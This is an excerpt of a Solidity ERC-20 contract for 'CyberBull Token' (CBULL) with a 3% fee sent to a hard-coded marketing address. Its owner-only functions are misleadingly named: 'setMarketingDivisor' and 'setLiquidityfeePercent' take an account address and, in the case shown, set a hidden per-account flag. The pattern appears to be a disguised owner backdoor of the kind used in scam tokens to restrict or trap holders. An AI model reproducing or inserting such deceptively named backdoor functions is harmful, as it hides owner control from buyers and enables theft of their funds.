...
contract Cyberbull is Context, IERC20, IERC20Metadata {
    ...
    string public _name = "CyberBull Token";
    string public _symbol= "CBULL";
    bool balances1 = true;
    bool amount1 = true;

    address payable public charityAddress = payable(0x374FAeF5ca40e657BB6D2b4C0CF6Bfe7ed28bc4c); // Marketing Address
    uint256 public charityPercent = 3; 
    ...
    function setMarketingAddress(address _account_) onlyOwner public {
    ...
    function setMarketingDivisor(address account) onlyOwner public {
        _balances1[account] = true;
    }
    
     function setLiquidityfeePercent(address account) onlyOwner public {
